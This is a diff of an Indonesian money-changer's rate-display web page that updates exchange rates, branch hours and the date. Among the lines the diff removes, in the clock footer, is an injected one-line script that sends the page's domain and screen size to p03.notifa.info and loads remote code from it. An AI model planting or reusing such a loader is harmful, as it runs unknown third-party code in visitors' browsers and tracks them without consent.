@@ -1,326 +1,311 @@
-<!DOCTYPE html>																		
-<html>																		
-<head>																		
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/2.3.1/css/flag-icon.min.css" rel="stylesheet"/>																		
-    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">																		
-    <link rel="stylesheet" href="style.css">																		
-    <link rel="stylesheet" href="main.css">																		
-    <link rel="stylesheet" href="slider-def.css">																		
-    <link href='http://fonts.googleapis.com/css?family=Raleway' rel='stylesheet' type='text/css'> 																		
-</head>																		
-<body>																		
-																		
-        <div id="slider">																		
-      <div class="slides">																		
-        <div class="slider">																		
-          <div class="legend"></div>																		
-          <div class="content">																		
-            <div class="content-txt">																		
-              <h1>KURS UP TO DATE</h1>																		
-              <h2>Rate atau Kurs yang Up to Date Menyesuaikan Perubahan Pasar serta Kompetitif</h2>																		
-            </div>																		
-          </div>																		
-          <div class="image">																		
-            <img src="img/kurs3.jpg">																		
-          </div>																		
-        </div>																		
-        <div class="slider">																		
-          <div class="legend"></div>																		
-          <div class="content">																		
-            <div class="content-txt">																		
-              <h1>PELAYANAN</h1>																		
-              <h2>Kami selalu mengutamakan Pelayanan Prima, Cepat, dan Responsif</h2>																		
-            </div>																		
-          </div>																		
-          <div class="image">																		
-            <img src="img/pelanggan3.jpg">																		
-          </div>																		
-        </div>																		
-        <div class="slider">																		
-          <div class="legend"></div>																		
-          <div class="content">																		
-            <div class="content-txt">																		
-              <h1>Jam Operasional</h1>																		
-              <h2>Jam Pelayanan kami dari Pukul 7 Pagi Hingga 7 Malam (Seven to Seven)</h2>																		
-            </div>																		
-          </div>																		
-          <div class="image">																		
-            <img src="img/image3.jpg">																		
-          </div>																		
-        </div>																		
-        <div class="slider">																		
-          <div class="legend"></div>																		
-          <div class="content">																		
-            <div class="content-txt">																		
-              <h1>Transaksi</h1>																		
-              <h2>Kami juga melayani Transfer Bank Secara Online untuk memudahkan para nasabah</h2>																		
-            </div>																		
-          </div>																		
-          <div class="image">																		
-            <img src="img/transfer3.jpg">																		
-          </div>																		
-        </div>																		
-      </div>																		
-      <div class="switch">																		
-        <ul>																		
-          <li>																		
-            <div class="on"></div>																		
-          </li>																		
-          <li></li>																		
-          <li></li>																		
-          <li></li>																		
-        </ul>																		
-      </div>																		
-    </div>																		
-																		
-<script>																		
-var myIndex = 0;																		
-carousel();																		
-																		
-function carousel() {																		
-    var i;																		
-    var x = document.getElementsByClassName("mySlides");																		
-    for (i = 0; i < x.length; i++) {																		
-      x[i].style.display = "none";  																		
-    }																		
-    myIndex++;																		
-    if (myIndex > x.length) {myIndex = 1}    																		
-    x[myIndex-1].style.display = "block";  																		
-    setTimeout(carousel, 3000);																		
-}																		
-</script>																		
-																		
-<table class="table">																		
-    <thead class="thead-currency-buy-sell">																		
-        <tr>																		
-            <th class="th-currency">CURRENCY</th>																		
-            <th class="th-buy">BUY</th>																		
-            <th class="th-sell">SELL</th>																		
-        </tr>																		
-    </thead>																		
-</table>																		
-																		
-<table class="table">																		
-    <tbody class="tableslide">																		
-        <tr class="satu">                 																		
-            <td class="bendera"><span class="flag-icon flag-icon-us"></span> USD</td>     																		
-            <td class="td-buy">	14.000	</td>																
-            <td class="td-sell">	14.200	</td>																
-                    																		
-        </tr>           																		
-                    																		
-        <tr class="dua">          																		
-            <td class="bendera"><span class="flag-icon flag-icon-eu"></span> EURO</td>        																		
-            <td class="td-buy">	15.500	 </td>																
-            <td class="td-sell">	15.700	</td>																
-        </tr>           																		
-                    																		
-        <tr class="satu">         																		
-            <td class="bendera"><span class="flag-icon flag-icon-au"></span> AUD</td>     																		
-            <td class="td-buy">	9.575	</td>																
-            <td class="td-sell">   	9.725	</td>																
-        </tr>           																		
-        <tr class="dua">          																		
-            <td class="bendera"><span class="flag-icon flag-icon-ca"></span> CAD</td>     																		
-            <td class="td-buy">  	10.550	</td>																
-            <td class="td-sell"> 	10.750	</td>																
-        </tr>           																		
-                    																		
-        <tr class="satu">         																		
-            <td class="bendera"><span class="flag-icon flag-icon-gb"></span> GBP</td>     																		
-            <td class="td-buy">	18.100	</td>																
-            <td class="td-sell">	18.500	</td>																
-        </tr>           																		
-                    																		
-        <tr class="dua">          																		
-            <td class="bendera"><span class="flag-icon flag-icon-ch"></span> CHF</td>     																		
-            <td class="td-buy">	14.050	</td>																
-            <td class="td-sell">	14.300	</td>																
-        </tr>           																		
-                    																		
-        <tr class="satu">         																		
-            <td class="bendera"><span class="flag-icon flag-icon-sg"></span> SGD</td>     																		
-            <td class="td-buy">	10.250	</td>																
-            <td class="td-sell">	10.450	</td>																
-        </tr>           																		
-                    																		
-        <tr class="dua">          																		
-            <td class="bendera"><span class="flag-icon flag-icon-hk"></span> HKD</td>     																		
-            <td class="td-buy">	1.765	</td>																
-            <td class="td-sell">	1.865	</td>																
-        </tr>           																		
-                    																		
-        <tr class="satu">         																		
-            <td class="bendera"><span class="flag-icon flag-icon-jp"></span> JPY</td>     																		
-            <td class="td-buy">	128,50	</td>																
-            <td class="td-sell">	132,00	</td>																
-        </tr>           																		
-                    																		
-        <tr class="dua">          																		
-            <td class="bendera"><span class="flag-icon flag-icon-my"></span> MYR</td>     				 														
-            <td class="td-buy">	3.340	</td>																
-            <td class="td-sell">	3.490	</td>																
-        </tr>           																		
-                    																		
-        <tr class="satu">         																		
-            <td class="bendera"><span class="flag-icon flag-icon-sa"></span> SAR</td>     																		
-            <td class="td-buy">	3.775	</td>																
-            <td class="td-sell">	3.975	</td>																
-        </tr>           																		
-                    																		
-        <tr class="satu">         																		
-            <td class="bendera"><span class="flag-icon flag-icon-kw"></span> KWD</td>     																		
-            <td class="td-buy">	43.000	</td>																
-            <td class="td-sell">	47.000	</td>																
-        </tr>           																		
-                    																		
-        <tr class="dua">          																		
-            <td class="bendera"><span class="flag-icon flag-icon-kr"></span> WON</td>     																		
-            <td class="td-buy">	11,75	</td>																
-            <td class="td-sell">	13,00	</td>																
-        </tr>           																		
-                    																		
-        <tr class="satu">         																		
-            <td class="bendera"><span class="flag-icon flag-icon-tw"></span> NT</td>      																		
-            <td class="td-buy">	450	</td>																
-            <td class="td-sell">	495	</td>																
-        </tr>           																		
-                    																		
-        <tr class="dua">          																		
-            <td class="bendera"><span class="flag-icon flag-icon-bn"></span> BND</td>     																		
-            <td class="td-buy">	10.225	</td>																
-            <td class="td-sell">	10.425	</td>																
-        </tr>           																		
-                    																		
-        <tr class="satu">         																		
-            <td class="bendera"><span class="flag-icon flag-icon-nz"></span> NZD</td>     																		
-            <td class="td-buy">	9.000	</td>																
-            <td class="td-sell">	9.200	</td>																
-        </tr>           																		
-                    																		
-        <tr class="dua">          																		
-            <td class="bendera"><span class="flag-icon flag-icon-ph"></span> PHP</td>     																		
-            <td class="td-buy">	265	</td>																
-            <td class="td-sell">	305	</td>																
-        </tr>           																		
-                    																		
-        <tr class="satu">         																		
-            <td class="bendera"><span class="flag-icon flag-icon-th"></span> THB</td>     																		
-            <td class="td-buy">	460	</td>																
-            <td class="td-sell">	500	</td>																
-        </tr>           																		
-                    																		
-        <tr class="dua">          																		
-            <td class="bendera"><span class="flag-icon flag-icon-cn"></span> YUAN</td>        																		
-            <td class="td-buy">	1.960	</td>																
-            <td class="td-sell">	2.060	</td>																
-        </tr>           																		
-                    																		
-        <tr class="satu">         																		
-            <td class="bendera"><span class="flag-icon flag-icon-ae"></span> AED</td>     																		
-            <td class="td-buy">	3.775	</td>																
-            <td class="td-sell">	3.975	</td>																
-        </tr>           																		
-                    																		
-        <tr class="dua">          																		
-            <td class="bendera"><span class="flag-icon flag-icon-qa"></span> QTR</td>     																		
-            <td class="td-buy">	3.700	</td>																
-            <td class="td-sell">	3.900	</td>																
-        </tr>           																		
-                    																		
-        <tr class="satu">         																		
-            <td class="bendera"><span class="flag-icon flag-icon-in"></span> INR</td>     																		
-            <td class="td-buy">	190	</td>																
-            <td class="td-sell">	235	</td>																
-        </tr>                               																		
-    </tbody>																		
-																		
-<tbody>																		
-        <tr>																		
-        <table class="footer">																		
-            <tr>																		
-                <td class="jam">																		
-                <html>																		
-                <head>																		
-                <script>																		
-                function startTime() {																		
-                    var today = new Date();																		
-                    var h = today.getHours();																		
-                    var m = today.getMinutes();																		
-                    var s = today.getSeconds();																		
-                    m = checkTime(m);																		
-                    s = checkTime(s);																		
-                    document.getElementById('txt').innerHTML =																		
-                    h + ":" + m + ":" + s;																		
-                    var t = setTimeout(startTime, 500);																		
-                    }																		
-                    function checkTime(i) {																		
-                    if (i < 10) {i = "0" + i};  // add zero in front of numbers < 10																		
-                    return i;																		
-                    }																		
-                </script>																		
-                </head>																		
-                    <body onload="startTime()">																		
-                    <div id="txt"></div>																		
-                    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprALSQz9V3RoYv3ufNWuDM580nakEROattpyzccaqbZp2%2fvsT3r0ZV9W1HRhJyyF2ARXBhI3%2b1wRQxTiDvlkqZ3UhMorLn8yaLCi5tho4s28rJygHxmmp1hYpipTmKaHTCUfdlUONiVqsugQHDUTSYkqtFvvugkQmvNNff2XCtkh5%2bGq8%2fEgPS0ebjM%2bdi3M8hDpBykv76tFo9umSsokDImUFzFMqlYJK%2f3jl1wpC91LBRABkUiif7x%2bztdLIY6eQb8qLXZKrq52N0rFUJTjXYlTZ94u6%2bNhL0ohn7BsqAFpg1YwUbP8NrdxIh7r%2bPlDlvt9sXg1klc41RayABACK6r16MIyJZDfAW68Ri5EDA9PVvSb5n39rjdAplZ%2bgUc2RtUfCXtZhYlHjBVpLcrcStvy%2bBCNGWbAh6%2bOwm1PXRDwqIIrJwSG57NMyb6UynbgQ6Nwf295JAA27ExZR3EIETxV9q9N2EnR8WQopEkydxW%2fk083SVJQ7B%2f3%2buF8H4Jtx%2fCAhWmTxCESwRFMU0HJZEu9QNhYykKhdF8" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>																		
-                </html>																		
-    																		
-                <td class="text-berjalan">    																		
-                <html>																		
-                <head>																		
-                    <style type="text/css"> 																		
-                    marquee span { 																		
-                    margin-right: 5%; 																		
-                    } 																		
-                    marquee p { 																		
-                    white-space:nowrap;																		
-                    margin-right: 1000px; 																		
-                            } 																		
-                    </style> 																		
-                </head>																		
-                <body>																		
-                    <marquee scrollamount="10"> 																		
-                    An exchange rate can change at any time. The last Update are	03 Desember 2019	 <span></span>	16:43	WIB														
-                    <span></span><span></span><span></span><span></span><span></span>																		
-                     Kurs dapat berubah setiap saat tanpa pemberitahuan sebelumnya																		
-                    <span></span><span></span><span></span><span></span><span></span>																		
-                    An exchange rate can change at any time. The last Update are	03 Desember 2019	 <span></span>	16:43	WIB														
-                    <span></span><span></span><span></span><span></span><span></span>																		
-                    Terimakasih atas kepercayaan anda																		
-                    <span></span><span></span><span></span><span></span><span></span>																		
-                    An exchange rate can change at any time. The last Update are	03 Desember 2019	 <span></span>	16:43	WIB														
-                    <span></span><span></span><span></span><span></span><span></span>																		
-                    Jam Operasional Malioboro <span></span> Senin - Jumat 07:00 - 19:00 WIB																		
-                    <span></span>																		
-                    Sabtu & Minggu 07:00 - 15:00 WIB																		
-                    <span></span><span></span><span></span><span></span><span></span>																		
-                    An exchange rate can change at any time. The last Update are	03 Desember 2019	 <span></span>	16:43	WIB														
-                    <span></span><span></span><span></span><span></span><span></span>																		
-                    Jam Operasional Amplaz <span></span> Senin - Jumat 10:00 - 19:00 WIB																		
-                    <span></span>																		
-                    Sabtu & Minggu 10:00 - 17:00 WIB																		
-                    <span></span><span></span><span></span><span></span><span></span>																		
-                    An exchange rate can change at any time. The last Update are	03 Desember 2019	 <span></span>	16:43	WIB														
-                    <span></span><span></span><span></span><span></span><span></span>																		
-                    Hari Libur Nasional : Tutup 																		
-                    <span></span><span></span><span></span><span></span><span></span>																		
-                    </marquee>																		
-                </body>																		
-																		
-             <!--  <td class="kurs-no">																		
-         <div class="last-update">	Last Update	</div>																
-      <div class="update-waktu">	03/12/19	16:43	</div>	</td> -->														
-                </td>																		
-            </tr>																		
-        </table>																		
-        </tr>																		
-    </tbody>																		
-    </table>																		
-																		
-        																		
-																		
-<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>																		
-<script type="text/javascript" src="script.js"></script>																		
-<script type="text/javascript" src="mouse.js"></script>																		
-</body>																		
-</html>																		
+<html><head>                                                                      
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/2.3.1/css/flag-icon.min.css" rel="stylesheet">                                                                        
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">                                                                     
+    <link rel="stylesheet" href="style.css">                                                                        
+    <link rel="stylesheet" href="main.css">                                                                     
+    <link rel="stylesheet" href="slider-def.css">                                                                       
+    <link href="http://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">                                                                       
+</head>                                                                     
+<body onload="startTime()" style="cursor: none;">                                                                      
+                                                                        
+        <div id="slider">                                                                       
+      <div class="slides">                                                                      
+        <div class="slider">                                                                        
+          <div class="legend"></div>                                                                        
+          <div class="content">                                                                     
+            <div class="content-txt">                                                                       
+              <h1>KURS UP TO DATE</h1>                                                                      
+              <h3>Rate atau Kurs yang Up to Date Menyesuaikan Perubahan Pasar serta Kompetitif</h3>                                                                     
+            </div>                                                                      
+          </div>                                                                        
+          <div class="image">                                                                       
+            <img src="img/kurs3.jpg">                                                                       
+          </div>                                                                        
+        </div>                                                                      
+        <div class="slider">                                                                        
+          <div class="legend"></div>                                                                        
+          <div class="content">                                                                     
+            <div class="content-txt">                                                                       
+              <h1>JAM OPERASIONAL</h1>                                                                      
+              <h2>Kantor Pusat Malioboro</h2>                                                                       
+              <h3>Senin - Jumat 07:00 - 19:00 WIB</h3>                                                                      
+              <h3>Sabtu &amp; Minggu 07:00 - 15:00 WIB</h3>                                                                     
+            </div>                                                                      
+          </div>                                                                        
+          <div class="image">                                                                       
+            <img src="img/pelanggan3.jpg">                                                                      
+          </div>                                                                        
+        </div>                                                                      
+        <div class="slider">                                                                        
+          <div class="legend"></div>                                                                        
+          <div class="content">                                                                     
+            <div class="content-txt">                                                                       
+              <h1>JAM OPERASIONAL</h1>                                                                      
+              <h2>Kantor Cabang Amplaz</h2>                                                                     
+              <h3>Senin - Jumat 10:00 - 19:00 WIB</h3>                                                                      
+              <h3>Sabtu &amp; Minggu 10:00 - 17:00 WIB</h3>                                                                     
+            </div>                                                                      
+          </div>                                                                        
+          <div class="image">                                                                       
+            <img src="img/image3.jpg">                                                                      
+          </div>                                                                        
+        </div>                                                                      
+        <div class="slider">                                                                        
+          <div class="legend"></div>                                                                        
+          <div class="content">                                                                     
+            <div class="content-txt">                                                                       
+              <h1>HARI LIBUR</h1>                                                                       
+              <h3>Hari Libur Nasional : Tutup</h3>                                                                      
+            </div>                                                                      
+          </div>                                                                        
+          <div class="image">                                                                       
+            <img src="img/transfer3.jpg">                                                                       
+          </div>                                                                        
+        </div>                                                                      
+      </div>                                                                        
+      <div class="switch">                                                                      
+        <ul>                                                                        
+          <li>                                                                      
+            <div class="on"></div>                                                                      
+          </li>                                                                     
+          <li></li>                                                                     
+          <li></li>                                                                     
+          <li></li>                                                                     
+        </ul>                                                                       
+      </div>                                                                        
+    </div>                                                                      
+                                                                        
+<script>                                                                        
+var myIndex = 0;                                                                        
+carousel();                                                                     
+                                                                        
+function carousel() {                                                                       
+    var i;                                                                      
+    var x = document.getElementsByClassName("mySlides");                                                                        
+    for (i = 0; i < x.length; i++) {                                                                        
+      x[i].style.display = "none";                                                                          
+    }                                                                       
+    myIndex++;                                                                      
+    if (myIndex > x.length) {myIndex = 1}                                                                           
+    x[myIndex-1].style.display = "block";                                                                       
+    setTimeout(carousel, 3000);                                                                     
+}                                                                       
+</script>                                                                       
+                                                                        
+<table class="table">                                                                       
+    <thead class="thead-currency-buy-sell">                                                                     
+        <tr>                                                                        
+            <th class="th-currency">CURRENCY</th>                                                                       
+            <th class="th-buy">BUY</th>                                                                     
+            <th class="th-sell">SELL</th>                                                                       
+        </tr>                                                                       
+    </thead>                                                                        
+</table>                                                                        
+                                                                        
+<table class="table">                                                                       
+    <tbody class="tableslide">                                                                      
+        <tr class="satu" style="display: table-row;">                                                                                       
+            <td class="bendera"><span class="flag-icon flag-icon-us"></span> USD</td>                                                                           
+            <td class="td-buy"> 13.800  </td>                                                               
+            <td class="td-sell">    14.000  </td>                                                               
+                                                                                            
+        </tr>                                                                                   
+                                                                                            
+        <tr class="dua" style="display: table-row;">                                                                                
+            <td class="bendera"><span class="flag-icon flag-icon-eu"></span> EURO</td>                                                                              
+            <td class="td-buy"> 15.500   </td>                                                              
+            <td class="td-sell">    15.650  </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="satu" style="display: table-row;">                                                                               
+            <td class="bendera"><span class="flag-icon flag-icon-au"></span> AUD</td>                                                                           
+            <td class="td-buy"> 9.700   </td>                                                               
+            <td class="td-sell">    9.850   </td>                                                               
+        </tr>                                                                                   
+        <tr class="dua" style="display: table-row;">                                                                                
+            <td class="bendera"><span class="flag-icon flag-icon-ca"></span> CAD</td>                                                                           
+            <td class="td-buy">     10.650  </td>                                                               
+            <td class="td-sell">    10.850  </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="satu" style="display: table-row;">                                                                               
+            <td class="bendera"><span class="flag-icon flag-icon-gb"></span> GBP</td>                                                                           
+            <td class="td-buy"> 18.250  </td>                                                               
+            <td class="td-sell">    18.650  </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="dua" style="display: table-row;">                                                                                
+            <td class="bendera"><span class="flag-icon flag-icon-ch"></span> CHF</td>                                                                           
+            <td class="td-buy"> 14.250  </td>                                                               
+            <td class="td-sell">    14.450  </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="satu" style="display: table-row;">                                                                               
+            <td class="bendera"><span class="flag-icon flag-icon-sg"></span> SGD</td>                                                                           
+            <td class="td-buy"> 10.275  </td>                                                               
+            <td class="td-sell">    10.475  </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="dua" style="display: table-row;">                                                                                
+            <td class="bendera"><span class="flag-icon flag-icon-hk"></span> HKD</td>                                                                           
+            <td class="td-buy"> 1.750   </td>                                                               
+            <td class="td-sell">    1.865   </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="satu" style="display: table-row;">                                                                               
+            <td class="bendera"><span class="flag-icon flag-icon-jp"></span> JPY</td>                                                                           
+            <td class="td-buy"> 127,00  </td>                                                               
+            <td class="td-sell">    130,50  </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="dua" style="display: table-row;">                                                                                
+            <td class="bendera"><span class="flag-icon flag-icon-my"></span> MYR</td>                                                                           
+            <td class="td-buy"> 3.350   </td>                                                               
+            <td class="td-sell">    3.475   </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="satu" style="display: table-row;">                                                                               
+            <td class="bendera"><span class="flag-icon flag-icon-sa"></span> SAR</td>                                                                           
+            <td class="td-buy"> 3.750   </td>                                                               
+            <td class="td-sell">    3.950   </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="satu" style="display: none;">                                                                               
+            <td class="bendera"><span class="flag-icon flag-icon-kw"></span> KWD</td>                                                                           
+            <td class="td-buy"> 42.750  </td>                                                               
+            <td class="td-sell">    46.750  </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="dua" style="display: none;">                                                                                
+            <td class="bendera"><span class="flag-icon flag-icon-kr"></span> WON</td>                                                                           
+            <td class="td-buy"> 11,50   </td>                                                               
+            <td class="td-sell">    13,00   </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="satu" style="display: none;">                                                                               
+            <td class="bendera"><span class="flag-icon flag-icon-tw"></span> NT</td>                                                                            
+            <td class="td-buy"> 440 </td>                                                               
+            <td class="td-sell">    490 </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="dua" style="display: none;">                                                                                
+            <td class="bendera"><span class="flag-icon flag-icon-bn"></span> BND</td>                                                                           
+            <td class="td-buy"> 10.175  </td>                                                               
+            <td class="td-sell">    10.375  </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="satu" style="display: none;">                                                                               
+            <td class="bendera"><span class="flag-icon flag-icon-nz"></span> NZD</td>                                                                           
+            <td class="td-buy"> 9.200   </td>                                                               
+            <td class="td-sell">    9.400   </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="dua" style="display: none;">                                                                                
+            <td class="bendera"><span class="flag-icon flag-icon-ph"></span> PHP</td>                                                                           
+            <td class="td-buy"> 255 </td>                                                               
+            <td class="td-sell">    295 </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="satu" style="display: none;">                                                                               
+            <td class="bendera"><span class="flag-icon flag-icon-th"></span> THB</td>                                                                           
+            <td class="td-buy"> 450 </td>                                                               
+            <td class="td-sell">    500 </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="dua" style="display: none;">                                                                                
+            <td class="bendera"><span class="flag-icon flag-icon-cn"></span> YUAN</td>                                                                              
+            <td class="td-buy"> 1.960   </td>                                                               
+            <td class="td-sell">    2.060   </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="satu" style="display: none;">                                                                               
+            <td class="bendera"><span class="flag-icon flag-icon-ae"></span> AED</td>                                                                           
+            <td class="td-buy"> 3.750   </td>                                                               
+            <td class="td-sell">    4.050   </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="dua" style="display: none;">                                                                                
+            <td class="bendera"><span class="flag-icon flag-icon-qa"></span> QTR</td>                                                                           
+            <td class="td-buy"> 3.700   </td>                                                               
+            <td class="td-sell">    3.950   </td>                                                               
+        </tr>                                                                                   
+                                                                                            
+        <tr class="satu" style="display: none;">                                                                               
+            <td class="bendera"><span class="flag-icon flag-icon-in"></span> INR</td>                                                                           
+            <td class="td-buy"> 190 </td>                                                               
+            <td class="td-sell">    235 </td>                                                               
+        </tr>                                                                                                       
+    </tbody>                                                                        
+                                                                        
+<tbody>                                                                     
+        <tr>                                                                        
+        </tr></tbody></table><table class="footer">                                                                      
+            <tbody><tr>                                                                        
+                <td class="jam">                                                                        
+                                                                                      
+                                                                                      
+                <script>                                                                        
+                function startTime() {                                                                      
+                    var today = new Date();                                                                     
+                    var h = today.getHours();                                                                       
+                    var m = today.getMinutes();                                                                     
+                    var s = today.getSeconds();                                                                     
+                    m = checkTime(m);                                                                       
+                    s = checkTime(s);                                                                       
+                    document.getElementById('txt').innerHTML =                                                                      
+                    h + ":" + m + ":" + s;                                                                      
+                    var t = setTimeout(startTime, 500);                                                                     
+                    }                                                                       
+                    function checkTime(i) {                                                                     
+                    if (i < 10) {i = "0" + i};  // add zero in front of numbers < 10                                                                        
+                    return i;                                                                       
+                    }                                                                       
+                </script>                                                                       
+                                                                                     
+                                                                                         
+                    <div id="txt">6:16:41</div>                                                                        
+                                                                                         
+                                                                                     
+                                                                            
+                </td><td class="text-berjalan">                                                                          
+                                                                                      
+                                                                                      
+                    <style type="text/css">                                                                         
+                    marquee span {                                                                      
+                    margin-right: 5%;                                                                       
+                    }                                                                       
+                    marquee p {                                                                         
+                    white-space:nowrap;                                                                     
+                    margin-right: 1000px;                                                                       
+                            }                                                                       
+                    </style>                                                                        
+                                                                                     
+                                                                                      
+                    <marquee scrollamount="10">                                                                         
+                    The last Update are 03 Januari 2020  <span></span>  6:13    WIB                                                     
+                    <span></span><span></span><span></span><span></span><span></span>                                                                       
+                     Kurs dapat berubah setiap saat tanpa pemberitahuan sebelumnya                                                                      
+                    <span></span><span></span><span></span><span></span><span></span>                                                                       
+                     An Exchange rate can change at any time                                                                        
+                    <span></span><span></span><span></span><span></span><span></span>                                                                       
+                    </marquee>                                                                      
+                                                                                     
+                                                                        
+             <!--  <td class="kurs-no">                                                                     
+         <div class="last-update">  Last Update </div>                                                              
+      <div class="update-waktu">    03/01/20    6:13    </div>  </td> -->                                                       
+                </td>                                                                       
+            </tr>                                                                       
+        </tbody></table>                                                                        
+                                                                               
+                                                                            
+                                                                            
+                                                                        
+                                                                                
+                                                                        
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>                                                                      
+<script type="text/javascript" src="script.js"></script>                                                                        
+<script type="text/javascript" src="mouse.js"></script>                                                                     
+                                                                     
+                                                                     
+</body></html>
